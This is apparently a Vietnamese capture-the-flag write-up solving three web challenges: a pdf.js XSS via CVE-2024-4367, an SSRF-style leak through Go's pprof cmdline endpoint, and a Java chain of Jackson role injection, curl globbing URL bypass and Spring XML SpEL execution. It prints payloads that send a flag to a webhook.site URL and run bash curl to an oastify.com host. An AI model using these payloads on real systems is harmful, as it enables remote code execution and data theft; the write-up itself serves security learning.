# Upload

Nhìn sơ qua thì chall này cung cấp cho mình 2 link, 1 link của chall, 1 link của bot (thực ra là 1, cùng domain nhưng khác route) thì đây chắc chắn là 1 chall về XSS rồi.

![image](https://hackmd.io/_uploads/rJdrGyNBR.png)

Flag giấu ở endpoint `/flag` và chỉ nhận ip từ localhost, port là 5000 cho nên payload XSS của chúng ra phải route con bot đến đây và fetch sang webhook của chúng ta.

Nhưng chall chỉ cho chúng ta upload 1 file dạng pdf sử dụng pdf.js 

![image](https://hackmd.io/_uploads/HJC6MyVHC.png)

Ở đây version của nó là `2.16.105`

![image](https://hackmd.io/_uploads/HyjqXJVBR.png)

nhưng mình tìm được 1 CVE mới diễn ra hồi tháng 5 vừa qua đó là thực thi mã JS bất kì khi sử dụng 1 file PDF độc hại.

![image](https://hackmd.io/_uploads/rJIOmkVrR.png)


Thử upload file pdf độc hại lên check.

![image](https://hackmd.io/_uploads/BJm-4k4BR.png)

Alert đã có. Giờ viết payload sao để flag route đến webhook của mình thôi.

Payload `fetch('/flag').then(response => { return response.json(); }).then\(data => { fetch('https://webhook.site/a7c640b4-bf85-48b3-bfa1-db406cf9d89a', {method: 'POST',mode: 'no-cors',body: JSON.stringify(data)}) })`

![image](https://hackmd.io/_uploads/SJKT41EHA.png)

> Chú ý khi sửa payload trong BurpSuite thì mình phải để các dấu `\` trước các dấu `()`. (Đọc kĩ [PoC](https://codeanlabs.com/blog/research/cve-2024-4367-arbitrary-js-execution-in-pdf-js/) để biết tại sao).

Gửi đến con bot: http://127.0.0.1:5000/view/file-1717986450021.pdf

![image](https://hackmd.io/_uploads/rJ1UHyVSR.png)

Flag: `AKASEC{PDF_1s_4w3s0m3_W1th_XSS_&&_Fr33_P4le5T1n3_r0t4t333d_loooool}`


# Proxy For Life 
 
![image](https://hackmd.io/_uploads/SkB6HkVHC.png)

Nhìn preview kiểu này nghĩ ngay đến SSRF đúng không? Tiếp theo đọc source code. 

![image](https://hackmd.io/_uploads/Sk1fLyNH0.png)

Nó sau khi fetch đến URL user cung cấp rồi sẽ đọc response rồi render ra. Nghĩ ngay đến SSTI đúng không? NHƯNG, nhưng 2 lỗ hổng này còn thiếu 1 điều gì đó mới exploit được
1. SSRF: ![image](https://hackmd.io/_uploads/B19F8JErC.png)
Ở đây web sử dụng doyensec để get đến url, 1 công cụ chống SSRF open source, và dùng bản lastest được phát hành từ năm ngoái (v 0.2.1)
2. SSTI: ![image](https://hackmd.io/_uploads/BkIevJVSA.png)
. Hàm renderTemplate này chỉ sử dụng ExecuteTemplate cùng với loại mà nó import `'html/template'` cho nên nó chỉ parse các thẻ html của mình được thôi. Nếu có thì chỉ reflected XSS được thôi.

Sau khi giải kết thúc, người ta mới cung cấp cho mình 1 cái [link](https://pkg.go.dev/net/http/pprof). 
Web này có phần import giống với cái link trên `import _ "net/http/pprof"`, cùng với đoạn sau

![image](https://hackmd.io/_uploads/S1_TPJNrC.png)

Cụ thể thì web sẽ respond với command line của chương trình đang chạy, với các argument ngăn cách nhau bởi dấu null byte. Và dockerfile của chall, flag được register dưới dạng 1 argument khi chạy chương trình.

![image](https://hackmd.io/_uploads/ByYQOkVSA.png)

Route đến /debug/pprof/cmdline, flag is here. 

![image](https://hackmd.io/_uploads/Sk8P_14S0.png)

Flag: `AKASEC{r0t4t3d_p20x1n9_f002_11f3_15n7_92347_4f732_411____}`

# HackerNickName

Chall này sẽ liên quan đến 3 kĩ thuật sau:
1. Set admin thành True thông qua [CVE-2021-25646](https://blog.kuron3k0.vip/2021/04/10/vulns-of-misunderstanding-annotation/)
2. [Curl Globbing](https://everything.curl.dev/cmdline/globbing.html)
3. [Class Instantiation](https://samuzora.com/posts/rwctf-2024/)

## CVE-2021-25646
CVE này liên quan tới việc thư viện Jackson xử lý Json. 
> Jackson là 1 thư viện của java chứa rất nhiều chức năng để đọc và xây dựng JSON. Nó có khả năng ràng buộc dữ liệu mạnh mẽ và cung cấp 1 framework để tuỳ chỉnh quá trình chuyển đổi đối tượng Java sang chuỗi JSON và ngược lại.

```java=
public class User {

    public  String username;

    public String password;

    public String isAdmin="false";

    @JsonCreator
    public User(
            @JsonProperty("username") String username,
            @JsonProperty("password") String password,
            @JacksonInject String isAdmin){
        this.isAdmin=isAdmin;
        this.username=username;
        this.password=password;
    }

    @Override
    public String toString(){
        return this.username+"/"+this.password+"/"+this.isAdmin;
    }
}
```

Bên trên là đoạn code mẫu. Nó sử dụng ba annotation của Jackson 

1. @JsonCreater
> Chúng ta có thể sử dụng @JsonCreater annotation để điều chỉnh constructor được sử dụng trong deserialization
2. @JsonProperty
> Chúng ta có thể thêm @JsonProperty annotation để chỉ ra tên thuộc tính trong JSON.
3. @JacksonInject
> @JacksonInject chỉ ra rằng 1 thuộc tính sẽ lấy giá trị từ việc inject mà không lấy từ JSON data. Nó rất hữu ích khi bạn cần inject các giá trị không có trong dữ liệu JSON vào cá đối tượng Java. Điều này có thể giúp các bạn cấu hình các giá trị mặc định hoặc inject nó trong quá trình deserialization 1 cách dễ dàng. Nghe thì tưởng là các giá trị của trường này user có thể inject vào (như các loại inject vulnerability khác) thông qua dữ liệu người dùng nhưng không, tên gọi của nó cũng khiến mình lúc đầu nghe qua cũng hiểu nhầm. 


Nếu ta truyền vào json như này thì sao `{"username":"admin","password":"1234","":true}`

Kết quả 
```
admin/1234/true

Process finished with exit code 0
```

Trường isAdmin đã được đặt thành true, tại sao khi thêm 1 khóa là 1 chuỗi rỗng với value đặt là true thì isAdmin được gán thành true. Điều này nó liên quan đến việc xử lý logic của Jackson.

Đại khái thì JSON data sẽ được deserizaliation để lấy các giá trị tương ứng rồi gán cho các attribute của class. Sau khi deserialize xong JSON data, nó sẽ gọi đến hàm tạo của User và gán luôn attribute thứ ba của User (isAdmin) thành true luôn. Việc misconfig như vậy có thể gây ra RCE luôn.

Trở lại với challenge, đoạn code để gán user role cũng khá là tương tự với đoạn code mẫu trên. 
![image](https://hackmd.io/_uploads/SkiYDqVrA.png)
Ở đây, author sử dụng role với type là class UserRole như dưới. 
![image](https://hackmd.io/_uploads/HJx_JdqErC.png)

Do việc sử dụng biến role có kiểu dữ liệu là 1 class cho nên khi truyền vào ta cũng phải truyền vào dạng 1 object có cặp key-value là `"admin":True`.

![image](https://hackmd.io/_uploads/ryEKOcVHR.png)
Thực hiện inject như ảnh, ta đã có được role admin. 

## cURL globbing bypass URL checking
### Preview

![image](https://hackmd.io/_uploads/HyMqt9EBR.png)

Trong admin controller, ta có đoạn check URL như sau

![image](https://hackmd.io/_uploads/H1j5t94SA.png)

Việc bypass đoạn này rất quan trọng để ta đến được route cuối cùng `/ExperimentalSerializer` và nó yêu cầu IP là 127.0.0.1

![image](https://hackmd.io/_uploads/SkXkccVS0.png)

NHƯNG, đoạn code check URL trong admin controller lại yêu cầu mình phải cung cấp 1 URL có host là nicknameservice, port là 5000 nhưng port của web challenge này sử dụng port 8090. Vậy thì phải làm như thế nào?

Chú ý bên dưới, web sử dụng ProcessBuilder với lệnh curl. Và lệnh curl có 1 điều rất thú vị như sau: 
> Khi bạn muốn nhận được nhiều URL gần giống nhau, chỉ 1 phần nhỏ trong số đó thay đổi giữa các yêu cầu. Có thể là 1 dãy số hoặc tập hợp các tên, curl cung cấp 1 tính năng gọi là "globbing" như 1 cách để chỉ định nhiều URL như vậy sử dụng các dấu [] và {}.
> Dấu [] thì nó được sử dụng để yêu cầu 1 phạm vi từ như kiểu là [1-10] hoặc [a-z]. Ví dụ `curl -O "http://example.com/[1-100].png"`
> Còn về dấu {}, nó được sử dụng để chứa các list như kiểu là {one,two,three,four,five}. Ví dụ `curl -O "http://example.com/{one,two,three,alpha,beta}.html"`

Lợi dụng điều này ta có thể đánh lừa việc parseURL của java với payload sau: `http://{127.0.0.1:8090,@nicknameservice:5000/}/`

![image](https://hackmd.io/_uploads/SkFgNsVHR.png)

Bypass được đoạn check URL của admin controller. Tiếp theo ta đến với route `/ExperimentalSerializer`

## Class Instantiation and SPEL Injection 

Tại route này nó sẽ có flow thực hiện như sau

![image](https://hackmd.io/_uploads/Hkn1lFBH0.png)

Nó nhận vào data của mình với argument là serialized, sau đó gán cho biến result bằng kết của của hàm deserialize, method của class ExperimentalSerializer, sau đó thêm vào model 1 attribute mới có tên là result và value là biến result trước đó chuyển về dạng human-readable.

![image](https://hackmd.io/_uploads/HyTB-YrBC.png)

Tại class ExperimentalSerializer, hàm deserialize sẽ thực hiện như sau:
1. Tạo 1 biến có kiểu dữ liệu ObjectMapper, là 1 lớp trong thư viện của Jackson xử lý dữ liệu JSON trong Java. Nó cung cấp các chức năng để chuyển đổi giữa các đối tượng trong Java thành dạng JSON
2. Tạo biến result có là HashMap có key là String và value là Object
3. `List<SerializationItem> dataList = mapper.readValue(serialized, new TypeReference<List<SerializationItem>>() {});`
> Sử dụng ObjectMapper để chuyển đổi dữ liệu JSON thành 1 kiểu dữ liệu TypeReference chứa danh sách các đối tượng `SerializationItem`.
> TypeReference trong thư viện Jackson là 1 lớp giúp giải quyết vấn đề kiểu dữ liệu phức tạp trong Java. Khi deserialize 1 chuỗi JSON thành 1 đối tượng Java, Jackson cần biết kiểu dữ liệu của đối tượng mục tiêu. ĐIều này tương đối dễ dàng với các kiểu đơn giản như String hay int, nhưng đối với các kiểu dữ liệu phức tạp như  `List<SerializationItem>` hoặc `Map<String, List<SerializationItem>>`, ta cần phải sử dụng TypeReference để giữ thông tin chính xác trong quá trình chuyển đổi. 

Lớp SerializationItem sẽ có các thuộc tính sau

![image](https://hackmd.io/_uploads/SyTHVKSrA.png)

4. Sau đó check từng Item trong List vừa mapper có kiểu dữ liệu nào. Ở đây điều mà chúng ta cần quan tâm nhất đó chính là đoạn sau. Đây là 1 cách trong Java để tạo các đối tượng dynamic từ data input.
![image](https://hackmd.io/_uploads/SJW1BYSH0.png)

- Nó thực hiện ngắt các argument bằng dấu `|` trong item.value
- Lấy tên class từ args[0]
- Lấy constructor của lớp vừa tạo bên trên với tham số kiểu String
- Tạo 1 instance của lớp vừa tạo
- Đưa nó vào biến result
    
Author của bài này hướng player đến việc tìm kiếm các gadget là các libraries được load vào trong app, mà cho phép bạn khởi tạo class như kiểu là `constructor.newInstance(args)`

```xml=
<?xml version="1.0" encoding="UTF-8" ?>
<beans xmlns="http://www.springframework.org/schema/beans"
        xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
        xsi:schemaLocation="http://www.springframework.org/schema/beans
        http://www.springframework.org/schema/beans/spring-beans.xsd">
<bean class="#{T(java.lang.Runtime).getRuntime().exec(
        new String[] {
        '/bin/bash', '-c', 'curl kd11rpy190vlsttafaar26d3xu3lrcf1.oastify.com/?flag=$(/readflag|base64)'
        }
        )}"></bean>
</beans>
```
Payload trên sử dụng `T(class)` rất hữu dụng trong việc khởi tạo class từ các cái tên hợp lệ. Theo đó, mình sẽ khởi tạo 1 class nh`org.springframework.context.support.FileSystemXmlApplicationContext`. Nó sẽ parse external XML sử dụng template processing, cái mà có thể host ở trên server của mình. 
P/s: Phase 3 này liên quan đến khá là nhiều thứ như [CVE-2023-46604](https://vulncheck.com/blog/cve-2023-44604-activemq-in-memory) và SpEL Injection mà mình chưa có research kĩ lắm, cho nên viết cũng chưa được clear. 

Payload khi đưa vào serial sẽ như sau: `[{"type":"object","name":"TypeReference","value":"org.springframework.context.support.FileSystemXmlApplicationContext|' + ATTACKER + '"}]`

Giờ mình sẽ thực hiện lại các bước để giải bài này:

1. ![image](https://hackmd.io/_uploads/SkIeRYSHC.png)
2. ![image](https://hackmd.io/_uploads/HJT2RtBHC.png)
3. ![image](https://hackmd.io/_uploads/BJnIicSSR.png)
4. ![image](https://hackmd.io/_uploads/S1hQlqBrA.png)








https://www.cookieshq.co.uk/posts/multiparameter-attributes